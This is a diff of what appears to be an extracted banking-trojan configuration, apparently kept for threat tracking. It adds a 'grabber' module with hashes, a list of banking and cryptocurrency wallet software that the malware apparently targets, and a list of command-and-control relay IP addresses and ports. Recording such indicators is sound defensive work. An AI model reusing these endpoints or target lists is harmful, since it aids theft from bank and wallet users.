@@ -31,9 +31,24 @@
       <name>n/a</name>
       <crc>0x1d1df6f5</crc>
     </module>
+    <module>
+      <sha256>840e204392d2183ec7198917f73c9765f79d4baa0a05721f1d9a41b8670a7608</sha256>
+      <sha1>dc8a5f69bc48c4475bc4a44e7eb0fd99a5a7a537</sha1>
+      <md5>2680cd66b98910d26bfd815d83ca330f</md5>
+      <timestamp>2017-05-12T19:19:16+00:00</timestamp>
+      <architecture>64</architecture>
+      <name>grabber</name>
+      <crc>0x4d38f016</crc>
+    </module>
   </modules>
   <commands>
-    <cmd id="651487" type="19">
+    <cmd id="762358" type="15">
+      <fs>crealogix,multiversa,abacus,ebics,agro-office,cashcomm,softcrew,coconet,macrogram,mammut,omikron,multicash,quatersoft,alphasys,wineur,epsitec,myaccessweb,bellin,financesuite,moneta,softcash,trinity,financesuite,abrantix,starmoney,sfirm,migrosbank,migros bank,online banking,star money,multibit,bitgo,bither,blockchain,copay,msigna,armory,electrum,coinbase,magnr,keepkey,coinsbank,coolwallet,bitoex,xapo,changetip,coinapult,blocktrail,breadwallet,luxstack,airbitz,schildbach,ledger nano,mycelium,trezor,coinomi,bitcore</fs>
+    </cmd>
+    <cmd id="762360" type="22">
+      <fs/>
+    </cmd>
+    <cmd id="842696" type="19">
       <fs/>
     </cmd>
   </commands>
@@ -503,4 +518,82 @@ qweqweqwe.send();
       <ip>45.55.25.107</ip>
     </host>
   </c2>
+  <supernodes>
+    <node>
+      <ip>37.153.92.6</ip>
+      <port>444</port>
+    </node>
+    <node>
+      <ip>37.153.92.6</ip>
+      <port>1443</port>
+    </node>
+    <node>
+      <ip>195.123.214.147</ip>
+      <port>443</port>
+    </node>
+    <node>
+      <ip>185.236.77.228</ip>
+      <port>443</port>
+    </node>
+    <node>
+      <ip>137.99.122.155</ip>
+      <port>443</port>
+    </node>
+    <node>
+      <ip>50.206.15.189</ip>
+      <port>8443</port>
+    </node>
+    <node>
+      <ip>24.192.173.97</ip>
+      <port>443</port>
+    </node>
+    <node>
+      <ip>76.112.27.179</ip>
+      <port>443</port>
+    </node>
+    <node>
+      <ip>120.150.176.33</ip>
+      <port>443</port>
+    </node>
+    <node>
+      <ip>212.32.242.204</ip>
+      <port>443</port>
+    </node>
+    <node>
+      <ip>116.73.18.59</ip>
+      <port>443</port>
+    </node>
+    <node>
+      <ip>99.229.216.212</ip>
+      <port>443</port>
+    </node>
+    <node>
+      <ip>24.228.72.116</ip>
+      <port>443</port>
+    </node>
+    <node>
+      <ip>172.249.88.69</ip>
+      <port>443</port>
+    </node>
+    <node>
+      <ip>193.251.189.134</ip>
+      <port>443</port>
+    </node>
+    <node>
+      <ip>37.153.92.6</ip>
+      <port>8443</port>
+    </node>
+    <node>
+      <ip>81.254.168.177</ip>
+      <port>443</port>
+    </node>
+    <node>
+      <ip>212.237.42.204</ip>
+      <port>443</port>
+    </node>
+    <node>
+      <ip>109.21.222.28</ip>
+      <port>443</port>
+    </node>
+  </supernodes>
 </settings>
